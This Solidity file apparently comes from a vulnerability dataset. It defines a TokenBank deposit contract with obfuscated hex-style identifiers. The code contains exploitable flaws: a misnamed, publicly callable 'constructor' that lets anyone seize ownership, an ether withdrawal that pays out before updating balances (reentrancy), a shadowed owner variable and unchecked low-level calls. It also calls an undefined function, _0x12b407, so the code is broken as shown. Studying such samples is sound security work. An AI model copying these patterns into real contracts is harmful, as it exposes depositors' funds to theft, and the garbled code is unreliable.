// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Ownable
{
    address _0x36fdcb;
    address _0xbaf8fd = msg.sender;

    function _0x7fa949(address _0x6b271e)
    public
    _0x32678a
    {
        _0x36fdcb = _0x6b271e;
    }

    function _0x8a3229()
    public
    {
        if(msg.sender==_0x36fdcb)
        {
            _0xbaf8fd=_0x36fdcb;
        }
    }

    modifier _0x32678a
    {
        if(_0xbaf8fd == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0xbaf8fd = msg.sender;
    function WithdrawToken(address _0xb2dafd, uint256 _0x11ce74,address _0xee64ae)
    public
    _0x32678a
    {
        _0xb2dafd.call(bytes4(_0x12b407("transfer(address,uint256)")),_0xee64ae,_0x11ce74);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;

     ///Constructor
    function _0x5390f2()
    public
    {
        _0xbaf8fd = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0xce00d1,address _0x339a05,uint _0x4d0f0f)
    public
    _0x32678a
    {
        if(Holders[_0xce00d1]>0)
        {
            Holders[_0xce00d1]=0;
            WithdrawToken(_0x339a05,_0x4d0f0f,_0xce00d1);
        }
    }

    function WithdrawToHolder(address _0xca6a05, uint _0x623b58)
    public
    _0x32678a
    payable
    {
        if(Holders[_0xca6a05]>0)
        {
            if(_0xca6a05.call.value(_0x623b58)())
            {
                Holders[_0xca6a05]-=_0x623b58;
            }
        }
    }
}